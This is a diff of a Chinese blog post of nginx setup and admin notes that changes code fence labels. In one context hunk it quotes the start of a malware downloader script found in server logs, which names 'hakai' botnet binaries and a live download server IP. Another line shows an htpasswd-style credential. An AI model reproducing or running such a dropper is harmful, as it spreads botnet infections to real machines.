@@ -19,7 +19,7 @@ tags: [nginx,tools]
 当然apt get 默认的源可能有些老，所以如果追求最新版本的话，可以[添加ppa](https://launchpad.net/~nginx/+archive/ubuntu/stable)
 
 
-```shell
+```bash
 sudo apt-get update
 sudo apt-get install nginx
 ## We can list the applications configurations that ufw knows how to work with by typing:
@@ -52,7 +52,7 @@ sudo apt-get update;sudo apt-get upgrade
 > lsof -i:80
 
 ## 2. 常用command
-```shell
+```bash
 ## 查看当前status
 systemctl status nginx
 ## stop
@@ -466,7 +466,7 @@ location ~* /image/.*\.(jpg|gif|png)$ {
 关于这个var/www目录，按照惯例，这个目录里面就应该放example.com,anothersite.com,myblog.com,...这种根据一个个site名来放置资源和html文件。一个文件夹里放一个site相关的资源，当然这只是惯例。
 
 ### 添加黑名单
-```shell
+```bash
 ##获取各个IP访问次数
 
 awk '{print $1}' nginx.access.log |sort |uniq -c|sort -n
@@ -637,7 +637,7 @@ http {
 ```
 
 关于sites-enabled和sites-available这两个文件夹。一般都是把真正的.conf文件写在sites-available里面，然后在sites-enable通过symbolic link去链接到sites-available中的文件。这样，万一哪天突然打算关掉某个website，直接删掉那个symbolic link就行了，但真正的配置文件不会被删掉
-```shell
+```bash
 sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/
 sudo ln -s /etc/nginx/sites-available/test.com /etc/nginx/sites-enabled/
 ```
@@ -912,7 +912,7 @@ location ~ (\.php$|myadmin) {
 至于这个脚本的内容是什么，似乎可以专门filter一下，然后proxy pass给特定的程序，不过这就麻烦了。[有专门的蜜罐处理这种行为](https://github.com/paralax/awesome-honeypots)
 
 后来在日志里面查到这样一个脚本，最终发现下载了一大堆binary file。
-```shell
+```bash
 #!/bin/sh
 n="hakai.mips hakai.arm5 hakai.mpsl hakai.x86_64"
 http_server="46.166.185.42"
@@ -969,7 +969,7 @@ ttlsa:xyJkVhXGAZ8tM
 [Install Let's Encrypt to Create SSL Certificates](https://www.linode.com/docs/security/ssl/install-lets-encrypt-to-create-ssl-certificates/)
 linode的教程非常实用，基本上就是这几条：
 注意，该过程需要请求网络，所以事先把nginx关掉，保证80和443端口都是没人在用的
-```shell
+```bash
 sudo git clone https://github.com/letsencrypt/letsencrypt /opt/letsencrypt
 cd /opt/letsencrypt
 sudo -H ./letsencrypt-auto certonly --standalone -d example.com -d www.example.com ##多一个二级域名就要多一个-d,就是说得一个个的写，不支持*.example.com这种
